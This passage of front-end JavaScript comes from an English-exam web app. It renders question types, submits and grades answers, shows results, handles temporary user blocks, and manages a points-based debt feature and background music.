      subDiv.appendChild(group);
      wrapper.appendChild(subDiv);
    });

    if (groupedWriteIn.length) {
      const subDiv = document.createElement('div');
      subDiv.className = 'exam-subquestion';
      groupedWriteIn.forEach(sub => {
        const p = document.createElement('p');
        p.className = 'question-text';
        p.innerHTML = `${sub.id}. ${sub.text.replace('____', `<input type="password" class="write-in-blank-input" name="q${sub.id}" autocomplete="off">`)}`;
        subDiv.appendChild(p);
      });
      wrapper.appendChild(subDiv);
    }

    if (groupedSelectOptions.length) {
      const subDiv = document.createElement('div');
      subDiv.className = 'exam-subquestion';
      groupedSelectOptions.forEach(sub => {
        const p = document.createElement('p');
        p.className = 'question-text';

        const match = sub.text.match(/^(.*?)\((.*?)\)(.*)$/);
        if (!match) {
          console.warn('Invalid select-options format:', sub.text);
          return;
        }

        const fullText = match[1].trim();
        const optionsStr = match[2].trim();
        const after = match[3].trim();

        const parts = fullText.split('____');
        if (parts.length < 2) {
          console.warn('No ____ found in select-options text:', sub.text);
          return;
        }

        const before = parts[0];
        const afterBlank = parts[1];

        const options = optionsStr.split('/').map(opt => opt.trim());
        const cleanOptions = options.map(opt => opt.replace(/\*\*/g, ''));

        const selectWrapper = document.createElement('div');
        selectWrapper.className = 'custom-select-wrapper';
        selectWrapper.dataset.qid = sub.id;

        const display = document.createElement('div');
        display.className = 'custom-select-display';

        const textSpan = document.createElement('span');
        textSpan.className = 'selected-text';
        textSpan.textContent = '';

        const icon = document.createElement('i');
        icon.className = 'fas fa-caret-down';

        display.appendChild(textSpan);
        display.appendChild(icon);

        const dropdown = document.createElement('div');
        dropdown.className = 'custom-select-dropdown';

        cleanOptions.forEach(optionText => {
          const option = document.createElement('div');
          option.className = 'custom-select-option';
          option.textContent = optionText;
          option.onclick = (e) => {
            e.stopPropagation();
            textSpan.textContent = optionText;
            selectWrapper.dataset.selected = optionText;
            selectWrapper.classList.remove('open');
            if (icon.parentNode) icon.remove();
          };
          dropdown.appendChild(option);
        });

        display.onclick = (e) => {
          e.stopPropagation();
          const isOpen = selectWrapper.classList.contains('open');
          document.querySelectorAll('.custom-select-wrapper.open').forEach(w => w.classList.remove('open'));
          if (!isOpen) {
            selectWrapper.classList.add('open');
            document.addEventListener('click', function closeDropdown(ev) {
              if (!selectWrapper.contains(ev.target)) {
                selectWrapper.classList.remove('open');
                document.removeEventListener('click', closeDropdown);
              }
            }, { once: true });
          }
        };

        selectWrapper.appendChild(display);
        selectWrapper.appendChild(dropdown);

        // Construct the p element with select-options in the middle
        const idSpan = document.createElement('span');
        idSpan.textContent = `${sub.id}. `;
        p.appendChild(idSpan);

        const beforeSpan = document.createElement('span');
        beforeSpan.textContent = before;
        p.appendChild(beforeSpan);

        p.appendChild(selectWrapper);

        const afterBlankSpan = document.createElement('span');
        afterBlankSpan.textContent = afterBlank;
        p.appendChild(afterBlankSpan);

        if (after) {
          const afterSpan = document.createElement('span');
          afterSpan.textContent = ` ${after}`;
          p.appendChild(afterSpan);
        }

        subDiv.appendChild(p);
      });
      wrapper.appendChild(subDiv);
    }

    if (groupedBoxChoose.length) {
      const subDiv = document.createElement('div');
      subDiv.className = 'exam-subquestion';
      const optionsDiv = document.createElement('div');
      optionsDiv.className = 'box-choose-options';
      let selected = null;

      function handleOptionClick(optEl) {
        const val = optEl.textContent;
        if (selected === val) {
          optEl.classList.remove('selected');
          selected = null;
          return;
        }
        optionsDiv.querySelectorAll('.box-choose-option').forEach(el => el.classList.remove('selected'));
        optEl.classList.add('selected');
        selected = val;
        subDiv.querySelectorAll('.box-choose-blank').forEach(blank => {
          if (!blank.textContent || blank.textContent === '_____') {
            blank.classList.add('highlight-pending');
            blank.style.borderColor = '#4a90e2';
          }
        });
      }

      const allOpts = [...new Set(groupedBoxChoose.flatMap(s => (s.options && s.options.length) ? s.options : (q.options || [])))];
      allOpts.forEach((opt, i) => {
        const span = document.createElement('span');
        span.className = 'box-choose-option';
        span.textContent = opt;
        span.style.setProperty('--index', i);
        span.onclick = () => handleOptionClick(span);
        optionsDiv.appendChild(span);
      });
      subDiv.appendChild(optionsDiv);

      groupedBoxChoose.forEach(sub => {
        const p = document.createElement('p');
        p.className = 'question-text';
        const id = `blank-${sub.id}`;
        p.innerHTML = `${sub.id}. ${sub.text.replace('____', `<span class="box-choose-blank" id="${id}" data-qid="${sub.id}">_____</span>`)}`;
        subDiv.appendChild(p);
      });

      setTimeout(() => {
        subDiv.querySelectorAll('.box-choose-blank').forEach(blank => {
          blank.onclick = () => {
            if (blank.classList.contains('filled')) {
              const restored = blank.dataset.value;
              const restoreSpan = document.createElement('span');
              restoreSpan.className = 'box-choose-option';
              restoreSpan.textContent = restored;
              restoreSpan.onclick = () => handleOptionClick(restoreSpan);
              optionsDiv.appendChild(restoreSpan);
              blank.textContent = '_____';
              blank.classList.remove('filled', 'highlight-pending');
              blank.style.borderColor = '';
              delete blank.dataset.value;
              selected = null;
              return;
            }
            if (!selected) return;
            blank.textContent = selected;
            blank.classList.add('filled');
            blank.classList.remove('highlight-pending');
            blank.dataset.value = selected;
            blank.style.borderColor = '';
            optionsDiv.querySelectorAll('.box-choose-option').forEach(optEl => {
              if (optEl.textContent === selected) optEl.remove();
            });
            selected = null;
          };
        });
      }, 0);

      wrapper.appendChild(subDiv);
    }

    content.appendChild(wrapper);
    window.scrollTo({ top: 0, behavior: 'smooth' });
  });

document.getElementById('finish-tasks-btn').onclick = () => {
  const btn = document.getElementById('floating-finish-btn');
  if (btn) btn.style.display = 'none';
  showFinishModal(title, questions);
};

document.getElementById('done-tasks-btn').onclick = () => {
  showPage('today');
  content.innerHTML = '';
  document.getElementById('done-tasks-btn').style.display = 'none';
  document.getElementById('finish-tasks-btn').style.display = 'inline-block';
  const floating = document.getElementById('floating-finish-btn');
  if (floating) floating.style.display = 'none';
};

let floatingBtn = document.getElementById('floating-finish-btn');
if (!floatingBtn) {
  floatingBtn = document.createElement('button');
  floatingBtn.id = 'floating-finish-btn';
  floatingBtn.innerHTML = '<i class="fas fa-check"></i> Finish Task';
  document.body.appendChild(floatingBtn);
}
floatingBtn.style.display = 'block';
floatingBtn.onclick = () => {
  floatingBtn.style.display = 'none';
  showFinishModal(title, questions);
};

  initCustomAudioPlayers();
}

// --------------------
// Модалка Finish-modal
// --------------------
function showFinishModal(taskName, questions) {
  let answeredCount = 0;
  let totalCount = 0;

  questions.forEach(q => {
    const subList = Array.isArray(q.subquestions) ? q.subquestions : [q];
    subList.forEach(sub => {
      totalCount++;
      if (sub.type === 'select-options') {
        const selected = document.querySelector(`.custom-select-wrapper[data-qid="${sub.id}"]`)?.dataset.selected;
        if (selected) answeredCount++;
      } else if (sub.type === 'write-in-blank') {
        const input = document.querySelector(`input[name="q${sub.id}"]`);
        if (input && input.value.trim()) answeredCount++;
      } else if (sub.type === 'box-choose') {
        const blank = document.querySelector(`.box-choose-blank[data-qid="${sub.id}"]`);
        if (blank && blank.classList.contains('filled')) answeredCount++;
      } else if (['multiple_choice', 'true_false'].includes(sub.type)) {
        const checked = document.querySelector(`input[name="q${sub.id}"]:checked`);
        if (checked) answeredCount++;
      } else if (sub.type === 'unscramble') {
        const filled = document.querySelectorAll(`.unscramble-inputs[data-qid="${sub.id}"] .filled`).length;
        if (filled > 0) answeredCount++;
      } else if (sub.type === 'picture' || sub.type === 'listening') {
        const input = document.querySelector(`input[name="q${sub.id}"]`);
        if (input && input.value.trim()) answeredCount++;
      }
    });
  });

  const unansweredCount = totalCount - answeredCount;

  // Удаляем старую модалку если есть
  const oldModal = document.querySelector('.Finish-modal');
  if (oldModal) oldModal.remove();

  const modal = document.createElement('div');
  modal.className = 'Finish-modal';
  modal.innerHTML = `
    <div class="Finish-modal-content">
      <h2>Are you sure that you want to finish?</h2>
      <p>Please note that once you finish the <b>${taskName}</b>, you will not be able to take it again</p>
      ${unansweredCount > 0 ? `<div class="Finish-warning">You did not answer ${unansweredCount} out of ${totalCount} questions!</div>` : ''}
      <div class="Finish-modal-buttons">
        <button class="Finish-btn-no">No</button>
        <button class="Finish-btn-yes">Yes</button>
      </div>
    </div>
  `;
  document.body.appendChild(modal);

  modal.querySelector('.Finish-btn-no').onclick = () => {
    modal.remove();
    const btn = document.getElementById('floating-finish-btn');
    if (btn) btn.style.display = 'block';
  };
  modal.querySelector('.Finish-btn-yes').onclick = () => {
    modal.remove();
    finishTodayTasks(taskName, questions);
  };
}

function getInstructionForType(type) {
  switch (type) {
    case 'multiple_choice': return 'Choose the correct option.';
    case 'true_false': return 'Select True or False.';
    case 'write-in-blank': return 'Fill in the blank with the correct word.';
    case 'unscramble': return 'Unscramble the letters to form the correct word.';
    case 'box-choose': return 'Click on a blank, then select a word from the box.';
    case 'question': return 'Write your answer in the box.';
    case 'picture': return 'Look at the image and answer.';
    default: return '';
  }
}

// ----------------------------
// 3. Сбор ответов и отправка на сервер с результатом и ошибками
// ----------------------------
// ----------------------------
// 3. Сбор ответов и отправка на сервер с результатом и ошибками (обновлённая версия)
// ----------------------------
function finishTodayTasks(title, questions) {
  initExamSecurity(false);
  updateStrikes();
  showNavigation();

  const answers = {};
  const missing = []; // будем отмечать незаполненные вопросы, но не блокировать отправку
  const content = document.getElementById('todaytasks-content');

  // --- 1. Radio groups (группируем по имени) ---
  const radioInputs = content.querySelectorAll('input[type="radio"][name^="q"]');
  if (radioInputs.length) {
    const radioNames = Array.from(new Set(Array.from(radioInputs).map(r => r.name)));
    radioNames.forEach(name => {
      const qid = name.slice(1);
      const checked = content.querySelector(`input[name="${name}"]:checked`);
      if (checked && checked.value.trim()) answers[qid] = checked.value;
      else missing.push(qid);
    });
  }

  // --- 2. Обычные input (не-radio) и textarea ---
  content.querySelectorAll('input[name^="q"]:not([type="radio"]), textarea[name^="q"]').forEach(el => {
    const qid = el.name.slice(1);
    const val = el.value.trim();
    if (val) answers[qid] = val;
    else missing.push(qid);
  });

  // --- 3. box-choose blanks ---
  content.querySelectorAll('.box-choose-blank').forEach(blank => {
    const qid = blank.dataset.qid;
    const val = (blank.dataset.value || '').trim();
    if (qid) {
      if (val) answers[qid] = val;
      else missing.push(qid);
    }
  });

  // --- 4. unscramble groups ---
  content.querySelectorAll('.unscramble-inputs').forEach(group => {
    const qid = group.dataset.qid;
    const inputs = group.querySelectorAll('.unscramble-input');
    const text = Array.from(inputs).map(span => (span.textContent || '').trim()).join('');
    if (qid) {
      if (text) answers[qid] = text;
      else missing.push(qid);
    }
  });

  // --- 5. listening inputs ---
  content.querySelectorAll('.listening-input').forEach(input => {
    const qid = input.name ? input.name.slice(1) : null;
    const val = (input.value || '').trim();
    if (qid) {
      if (val) answers[qid] = val;
      else missing.push(qid);
    }
  });

  // --- 6. select-options (custom select wrappers) ---
  content.querySelectorAll('.custom-select-wrapper').forEach(wrapper => {
    const qid = wrapper.dataset.qid;
    const selected = (wrapper.dataset.selected || '').trim();
    if (qid) {
      if (selected) answers[qid] = selected;
      else missing.push(qid);
    }
  });

  // Если есть пропущенные — предупредим, но не блокируем отправку
  if (missing.length > 0) {
    showToastNotification(`You left ${missing.length} question(s) unanswered — submitting partial answers.`, 'warning');
  }

  const payload = {
    level: currentLevel,
    unit: currentUnit,
    username: currentUser,
    title,
    answers
  };

  // ПОКАЗАТЬ МОДАЛКУ
  const updateModal = document.getElementById('updateModal');
  updateModal.style.display = 'flex';
  startUpdateStatusText();

  fetch('/api/submit-tasks', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  })
    .then(res => res.json().then(data => ({ ok: res.ok, data })))
    .then(({ ok, data }) => {
      // СКРЫТЬ МОДАЛКУ
      updateModal.style.display = 'none';
      stopUpdateStatusText();

      if (!ok) throw new Error(data.error || 'Submission failed');

      const { incorrect_list = [], correct, total, percent } = data;
      const resultHTML = [];

      resultHTML.push(`<h2 style="margin-bottom: 16px;">Result: ${correct}/${total} correct (${Math.round(percent)}%)</h2>`);

      if (incorrect_list.length > 0) {
        resultHTML.push(`<p style="color: #ffc107;"><i class="fa fa-exclamation-circle" aria-hidden="true"></i> You made mistakes in the following questions:</p>`);
        incorrect_list.forEach(item => {
          const q = questions.find(q =>
            q.id === item.q || (q.subquestions || []).some(sq => sq.id === item.q)
          );
          const sub = (q && q.subquestions) ? (q.subquestions.find(sq => sq.id === item.q) || q) : (q || { text: '' });

          resultHTML.push(`<div class="exam-subquestion" style="margin: 16px 0;">`);
          resultHTML.push(`<p class="question-text"><strong>${item.q}.</strong> ${sub.text || ''}</p>`);

          // multiple-choice / true-false
          if (sub.type === 'true_false' || (sub.type === 'multiple_choice' && Array.isArray(sub.options))) {
            const options = sub.type === 'true_false' ? ['True', 'False'] : sub.options;
            resultHTML.push(`<div class="question-options">`);
            options.forEach((opt, i) => {
              const isUser = String(item.user || '') === String(opt);
              const isCorrect = String(item.correct || '') === String(opt);
              const isWrong = isUser && !isCorrect;
              const letter = String.fromCharCode(65 + i);

              resultHTML.push(`
                <div class="option-group" style="display:flex;align-items:center;margin:6px 0;">
                  <input type="radio" disabled ${isUser ? 'checked' : ''} style="margin-right:8px;">
                  <label style="${isWrong ? 'background-color: #fdf2f2;' : ''}; padding:6px 8px; display:flex; align-items:center;">
                    <span class="option-letter" style="font-weight:700;margin-right:8px;">${letter}</span>
                    <span class="option-text">${opt}</span>
                    ${isWrong ? `<i class="fa fa-times" style="color:#f44336;margin-left:8px;" aria-hidden="true"></i>` : ''}
                    ${(!isWrong && isCorrect) ? `<i class="fa fa-check" style="color:#4caf50; margin: 10px;" aria-hidden="true"></i>` : ''}
                  </label>
                </div>
              `);
            });
            resultHTML.push(`</div>`);
          }

          // box-choose
          else if (sub.type === 'box-choose') {
            const isCorrect = String(item.user || '') === String(item.correct || '');
            resultHTML.push(`<div class="box-choose-options" style="display:flex;gap:12px;align-items:center;">`);
            resultHTML.push(`
              <span class="box-choose-blank ${isCorrect ? 'correct' : 'incorrect'}" style="padding:6px 10px;border-radius:6px;border:1px solid #ddd;">
                ${item.user || '—'} ${!isCorrect ? `<i class="fa fa-times" style="color:#f44336;margin-left:6px;" aria-hidden="true"></i>` : `<i class="fa fa-check" style="color:#4caf50;margin-left:6px;" aria-hidden="true"></i>`}
              </span>
              ${!isCorrect ? `<span class="box-choose-blank correct" style="padding:6px 10px;border-radius:6px;border:1px solid #e0f7ea;color:#2e7d32;"><i class="fa fa-check" aria-hidden="true"></i> ${item.correct}</span>` : ''}
            `);
            resultHTML.push(`</div>`);
          }

          // unscramble
          else if (sub.type === 'unscramble') {
            const userLetters = (item.user || '').split('');
            const correctLetters = (item.correct || '').split('');

            resultHTML.push(`<div class="unscramble-letters-review" style="display:flex;gap:6px;margin:8px 0;">`);
            const maxLen = Math.max(userLetters.length, correctLetters.length);
            for (let i = 0; i < maxLen; i++) {
              const userL = userLetters[i] || '';
              const corrL = correctLetters[i] || '';
              const ok = userL && corrL && userL === corrL;
              resultHTML.push(`<span class="unscramble-letter ${ok ? 'correct' : 'incorrect'}" style="display:inline-block;padding:6px 8px;border-radius:4px;border:1px solid #ddd;${ok ? 'background:#e8f5e9;' : 'background:#fff0f0;'}">${userL || '_'}</span>`);
            }
            resultHTML.push(`</div>`);
            resultHTML.push(`<p><strong>Correct:</strong> <span style="color:#4caf50">${item.correct}</span></p>`);
          }

          // select-options
          else if (sub.type === 'select-options') {
            const isCorrect = String(item.user || '') === String(item.correct || '');
            resultHTML.push(`<p><strong>Your Answer:</strong> <span style="${isCorrect ? 'color: #4caf50;' : 'color: #f44336;'}">${item.user || '—'}</span> ${isCorrect ? `<i class="fa fa-check" style="color:#4caf50;margin-left:6px;"></i>` : `<i class="fa fa-times" style="color:#f44336;margin-left:6px;"></i>`}</p>`);
            if (!isCorrect) {
              resultHTML.push(`<p><strong>Correct Answer:</strong> <span style="color: #4caf50;"><i class="fa fa-check" aria-hidden="true"></i> ${item.correct}</span></p>`);
            }
          }

          // текст / свободный ввод
          else {
            const isCorrect = String(item.user || '').trim().toLowerCase() === String(item.correct || '').trim().toLowerCase();
            resultHTML.push(`<p><strong>Your Answer:</strong> <span style="${isCorrect ? 'color:#4caf50' : 'color:#f44336'}">${item.user || '—'}</span> ${isCorrect ? `<i class="fa fa-check" style="color:#4caf50;margin-left:6px;"></i>` : `<i class="fa fa-times" style="color:#f44336;margin-left:6px;"></i>`}</p>`);
            if (!isCorrect) {
              resultHTML.push(`<p><strong>Correct Answer:</strong> <span style="color: #4caf50;"><i class="fa fa-check" aria-hidden="true"></i> ${item.correct}</span></p>`);
            }
          }

          resultHTML.push(`</div>`);
        });
      } else {
        resultHTML.push(`<p style="color: #4caf50;"><i class="fa fa-trophy" aria-hidden="true"></i> Excellent! You answered all questions correctly.</p>`);
      }

      // Рендер результата
      content.innerHTML = resultHTML.join('');
      if (percent >= 80) {
        new Audio('/static/music/Coins_Rewarded.mp3').play().catch(console.log);
      }

      // Убрать дождь/молнии (если были)
      document.querySelectorAll('.rain-drop, .lightning-flash, .lightning-drop').forEach(el => el.remove());

      // Добавить летнюю сцену в header (кешируем header)
      const header = document.getElementById('todaytasks-header');
      header.classList.add('summer-scene');

      // 🌙 Moon (иконы остаются DOM-элементами, не эмодзи)
      const moon = document.createElement('div');
      moon.className = 'moon';
      header.appendChild(moon);

      // 🌳 Tree
      const tree = document.createElement('div');
      tree.className = 'summer-tree';
      header.appendChild(tree);

      // ✨ Stars
      for (let i = 0; i < 30; i++) {
        const star = document.createElement('div');
        star.className = 'star';
        star.style.top = `${Math.random() * 60}%`;
        star.style.left = `${Math.random() * 100}%`;
        star.style.animationDelay = `${Math.random() * 4}s`;
        header.appendChild(star);
      }

      // 🪰 Fireflies
      for (let i = 0; i < 8; i++) {
        const firefly = document.createElement('div');
        firefly.className = 'firefly';
        firefly.style.top = `${60 + Math.random() * 40}%`;
        firefly.style.left = `${Math.random() * 100}%`;
        firefly.style.animationDelay = `${Math.random() * 5}s`;
        header.appendChild(firefly);
      }

      window.scrollTo({ top: 0, behavior: 'smooth' });

      // Buttons: скрыть кнопку finish и показать Done
      const finishBtn = document.getElementById('finish-tasks-btn');
      if (finishBtn) finishBtn.style.display = 'none';

      let doneBtn = document.getElementById('done-tasks-btn');
      if (!doneBtn) {
        doneBtn = document.createElement('button');
        doneBtn.id = 'done-tasks-btn';
        doneBtn.className = 'btn btn-success';
        doneBtn.style.padding = '0.5rem 1rem';
        doneBtn.style.fontSize = '1rem';
        doneBtn.textContent = 'Done';
        doneBtn.onclick = () => {
          showPage('today');
          content.innerHTML = '';
          doneBtn.style.display = 'none';
          if (finishBtn) finishBtn.style.display = 'inline-block';
        };
        document.getElementById('todaytasks-header').appendChild(doneBtn);
      } else {
        doneBtn.style.display = 'inline-block';
      }
    })
    .catch(err => {
      console.error(err);
      updateModal.style.display = 'none';
      stopUpdateStatusText();
      showToastNotification(err.message || 'Submission error', 'error');
    });
}



function initCustomAudioPlayers() {
  document.querySelectorAll('.custom-audio-player').forEach(player => {
    const btn = player.querySelector('.custom-play-btn');
    const audio = player.closest('.listening-audio').querySelector('audio');
    const progressBar = player.querySelector('.custom-audio-waves');
    const progress = player.querySelector('.progress');
    const timeDisplay = player.querySelector('.custom-time-display');

    audio.dataset.audioPlayerId = Math.random().toString(36).slice(2);

    btn.onclick = () => {
      document.querySelectorAll('audio').forEach(other => {
        if (other !== audio) {
          other.pause();
          other.currentTime = 0;
        }
      });

      if (audio.paused) {
        audio.play();
      } else {
        audio.pause();
      }
    };

    // ✅ Click to seek logic
    progressBar.addEventListener('click', (e) => {
      const rect = progressBar.getBoundingClientRect();
      const offsetX = e.clientX - rect.left;
      const percent = offsetX / rect.width;
      if (!isNaN(audio.duration)) {
        audio.currentTime = percent * audio.duration;
      }
    });

    audio.addEventListener('play', () => {
      btn.innerHTML = '<i class="fas fa-pause"></i>';
    });

    audio.addEventListener('pause', () => {
      btn.innerHTML = '<i class="fas fa-play"></i>';
    });

    audio.addEventListener('ended', () => {
      btn.innerHTML = '<i class="fas fa-play"></i>';
    });

    audio.addEventListener('timeupdate', () => {
      if (!isNaN(audio.duration)) {
        const percent = (audio.currentTime / audio.duration) * 100;
        progress.style.width = percent + '%';
        timeDisplay.textContent = formatTime(audio.currentTime);
      }
    });

    function formatTime(sec) {
      const m = Math.floor(sec / 60);
      const s = Math.floor(sec % 60).toString().padStart(2, '0');
      return `${m}:${s}`;
    }
  });
}




// ✅ При выборе box-choose-option вставляется в blank и удаляется
function handleBoxChooseInteraction(blankId, optionValue) {
  const blank = document.getElementById(blankId);
  if (!blank) return;
  blank.textContent = optionValue;
  blank.dataset.value = optionValue;

  // Удаляем выбранную опцию (поиск по значению и удаление)
  const options = document.querySelectorAll('.box-choose-option');
  options.forEach(opt => {
    if (opt.textContent === optionValue) {
      opt.remove();
    }
  });
}



// Плейсхолдер, если заданий нет
function renderNoTasksPlaceholder(container) {
  const placeholder = document.createElement('div');
  placeholder.className = 'no-tasks-placeholder';
  placeholder.innerHTML = `
    <div class="no-tasks-icon">
      <img src="/static/icons/no-tasks.png" alt="No Tasks Icon">
    </div>
    <div class="no-tasks-text">Tasks not assigned today</div>
  `;
  container.appendChild(placeholder);
  updateTaskCount();
}

function toggleAccordion(header) {
  const accordion = header.parentElement;
  accordion.classList.toggle('open');
}

function fetchExamResults() {
  fetch('/api/get_exam_results')
    .then(res => res.json())
    .then(data => {
      // ожидаем структуру { correct: …, total_questions: …, correct_percentage: … }
      examResults = data;
      updateExamDisplay();
    })
    .catch(err => {
      console.error('Failed to fetch exam results:', err);
    });
}

// Клиент слушает событие, которое сервер отправит в ответ
socket.on('tempBanUser', (data) => {
  console.log("Received tempBanUser event:", data);
  blockUser(data.username, data.duration);
});

// Клиент слушает событие unblockUser
socket.on('unblockUser', (data) => {
   stopSpecialMusic();
  console.log("Received unblockUser event:", data);
  unblockUsername(data.username);
});

const blockStates = new Map(); // { username: { isBlocked, timerInterval, blockEndTime, clickHandler } }
const blockScreen = document.getElementById("block-screen");
const timerElement = document.getElementById("timer");

// Форматирование времени MM:SS
function formatTimeBlock(seconds) {
  const minutes = Math.floor(seconds / 60);
  const secs = Math.floor(seconds % 60);
  return `${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
}

// Таймер блокировки
function startBlockTimer(username, duration, userState, timerElement) {
  let timeLeft = duration;
  let intervalId = null;
  let musicTriggered = false;

  timerElement.textContent = "Click here to start timer";
  timerElement.style.cursor = 'pointer';
  timerElement.classList.add('pulse-timer');

  const handleClick = () => {
    if (musicTriggered) return;
    musicTriggered = true;

    playSpecialMusic();
    timerElement.textContent = formatTimeBlock(timeLeft);
    timerElement.classList.remove('pulse-timer');
    timerElement.style.cursor = 'default';

    intervalId = setInterval(() => {
      timeLeft--;
      timerElement.textContent = formatTimeBlock(timeLeft);

      if (timeLeft <= 0) {
        clearInterval(intervalId);
        unblockUsername(username);
      }
    }, 1000);

    userState.timerInterval = intervalId;
  };

  // Удаляем старый обработчик, если был
  if (userState.clickHandler) {
    timerElement.removeEventListener('click', userState.clickHandler);
  }

  userState.clickHandler = handleClick;
  timerElement.addEventListener('click', handleClick);
}

// Блокировка пользователя
function blockUser(username, duration) {
  stopSpecialMusic();

  if (!Number.isInteger(duration) || duration <= 0) {
    console.log(`Invalid duration: ${duration}. Must be a positive integer.`);
    return;
  }

  const currentUser = getCurrentUser();
  if (username !== currentUser) return;

  let userState = blockStates.get(username) || {
    isBlocked: false,
    timerInterval: null,
    blockEndTime: null,
    clickHandler: null
  };

  // Очищаем старый таймер, если он был
  if (userState.timerInterval) {
    clearInterval(userState.timerInterval);
    userState.timerInterval = null;
  }

  // Показываем блокировку
  blockScreen.classList.remove('hidden');
  blockScreen.classList.add('visible');

  const blockEndTime = Date.now() + duration * 1000;
  userState.isBlocked = true;
  userState.blockEndTime = blockEndTime;

  try {
    localStorage.setItem(`blockEndTime_${username}`, blockEndTime);
  } catch (err) {
    console.error(`Failed to save blockEndTime: ${err.message}`);
  }

  document.body.style.pointerEvents = 'none';

  // 🔔 Уведомление о блокировке
  showToastNotification(
    `<b>Temporary Block</b> <span>${username}, your recent actions have violated our rules. You are temporarily blocked for ${duration / 60} minutes. Further violations may result in a permanent ban.</span>`,
    'error',
    8000
  );

  // Запускаем таймер
  startBlockTimer(username, duration, userState, timerElement);
  blockStates.set(username, userState); // Обновляем userState только после запуска таймера
}


// Разблокировка
function unblockUsername(username) {
  const userState = blockStates.get(username);
  if (!userState || !userState.isBlocked) {
    console.log(`User ${username} is not blocked.`);
    return;
  }

  if (userState.timerInterval) {
    clearInterval(userState.timerInterval);
    userState.timerInterval = null;
  }

  document.body.style.pointerEvents = 'auto';
  blockScreen.classList.remove("visible");

  stopSpecialMusic();
  messageTimestamps = [];

  timerElement.textContent = '';
  if (userState.clickHandler) {
    timerElement.removeEventListener('click', userState.clickHandler);
    userState.clickHandler = null;
  }

  try {
    localStorage.removeItem(`blockEndTime_${username}`);
  } catch (err) {
    console.error(`Failed to remove blockEndTime: ${err.message}`);
  }

  userState.isBlocked = false;
  blockStates.delete(username);
}


document.addEventListener("DOMContentLoaded", () => {
  const currentUser = getCurrentUser();
  if (!currentUser) {
    console.log("No current user found on page load.");
    return;
  }

  const blockEndTimeKey = `blockEndTime_${currentUser}`;
  const blockEndTimeRaw = localStorage.getItem(blockEndTimeKey);

  if (blockEndTimeRaw) {
    const blockEndTime = parseInt(blockEndTimeRaw, 10);
    const now = Date.now();
    const remainingTime = Math.floor((blockEndTime - now) / 1000);

    if (remainingTime > 0) {
      console.log(`🔒 User is still blocked for ${remainingTime} seconds`);
      // Восстанавливаем блокировку без озвучки
      const userState = {
        isBlocked: true,
        timerInterval: null,
        blockEndTime: blockEndTime
      };

      blockScreen.classList.remove('hidden');
      blockScreen.classList.add('visible');

      document.body.style.pointerEvents = 'none';

      startBlockTimer(currentUser, remainingTime, userState, timerElement);
      blockStates.set(currentUser, userState);
    } else {
      // Время блокировки истекло
      localStorage.removeItem(blockEndTimeKey);
      blockStates.delete(currentUser);
      console.log("✅ Block expired. Cleaned up.");
    }
  }
});

async function fetchDebts() {
  const res = await fetch(`/api/debts?username=${encodeURIComponent(currentUser)}`);
  const { incoming, outgoing } = await res.json();
  renderDebtList('incoming-debts', incoming, true);
  renderDebtList('outgoing-debts', outgoing, false);
}


function renderDebtList(containerId, debts, incoming) {
  const el = document.getElementById(containerId);
  el.innerHTML = '';
  if (!debts.length) {
    const msg = document.createElement('div');
    msg.className = 'debt-empty';
    msg.textContent = incoming
      ? 'You have no incoming debt proposals.'
      : 'You have no outgoing debt proposals.';
    el.appendChild(msg);
    return;
  }
  debts.forEach(d => {
    const card = document.createElement('div');
    card.className = 'debt-card';
    card.innerHTML = `
      <div class="debt-info">
        <strong>${incoming ? d.proposer : d.proposee}</strong>
        <small>${new Date(d.due_date).toLocaleString()}</small>
        <span class="debt-status ${d.label}">${d.label}</span>
        <span>${d.amount} pts + ${d.interest}%</span>
        <span>Total due: ${d.total_due}</span>
      </div>
      <div class="debt-actions">
        ${incoming && d.status==='pending' ?
          `<button class="accept" onclick="actionDebt(${d.id}, 'accept')">Accept</button>
           <button class="decline" onclick="actionDebt(${d.id}, 'decline')">Decline</button>`
        : ''}
        ${incoming && d.status==='accepted' ?
          `<button class="repay" onclick="actionDebt(${d.id}, 'repay')">Repay</button>`
        : ''}
      </div>
    `;
    el.appendChild(card);
  });
}

async function actionDebt(id, act) {
  const res = await fetch(`/api/debts/${id}/${act}`, { method:'POST' });
  const json = await res.json();
  showToastNotification(json.status || json.error, res.ok ? 'success' : 'error');
  fetchDebts();
}

// Модалка
const newBtn = document.getElementById('new-debt-btn');
newBtn.onclick = () => document.getElementById('debt-modal').style.display = 'flex';
const cancelBtn = document.getElementById('debt-cancel');
cancelBtn.onclick = () => document.getElementById('debt-modal').style.display = 'none';
const submitBtn = document.getElementById('debt-submit');
submitBtn.onclick = async () => {
  const user = document.getElementById('debt-user').value;
  const amount = +document.getElementById('debt-amount').value;
  const interest = +document.getElementById('debt-interest').value;

  // Берём локальную дату и переводим её в UTC+5
  const localDue = new Date(document.getElementById('debt-due').value);
  const utcPlus5 = new Date(localDue.getTime() - (localDue.getTimezoneOffset() * 60000) - (5 * 60 * 60 * 1000));
  const utcDue = utcPlus5.toISOString();

  const payload = {
    username: user,
    amount: amount,
    interest: interest,
    due_date: utcDue
  };

  const res = await fetch('/api/debts/propose', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });

  const j = await res.json();
  showToastNotification(j.status || j.error || 'Unknown response', res.ok ? 'success' : 'error');
  document.getElementById('debt-modal').style.display = 'none';
  fetchDebts();
};

let audioContext;
let sourceNode = null;
let gainNode = null;
let isMusicPlaying = false;

const tracks = [
  '/static/music/'
];

let currentTrackIndex = 0;

// 🔁 Кэш загруженных аудио
const audioBufferCache = new Map();

// 🔁 Функция для загрузки и кэширования трека
async function loadAndCacheTrack(url) {
  if (audioBufferCache.has(url)) {
    return audioBufferCache.get(url); // ✅ уже загружен
  }

  const response = await fetch(url);
  const arrayBuffer = await response.arrayBuffer();

  if (!audioContext) audioContext = new AudioContext();
  const audioBuffer = await audioContext.decodeAudioData(arrayBuffer);

  audioBufferCache.set(url, audioBuffer); // 📦 кэшируем
  return audioBuffer;
}

// 🔁 Воспроизведение трека из кэша
async function playNextTrack() {
  stopSpecialMusic(); // ⛔ остановка предыдущего трека

  const trackUrl = tracks[currentTrackIndex];

  try {
    const audioBuffer = await loadAndCacheTrack(trackUrl);

    gainNode = audioContext.createGain();
    gainNode.gain.value = 1.0;

    sourceNode = audioContext.createBufferSource();
    sourceNode.buffer = audioBuffer;
    sourceNode.connect(gainNode).connect(audioContext.destination);

    sourceNode.start();
    isMusicPlaying = true;

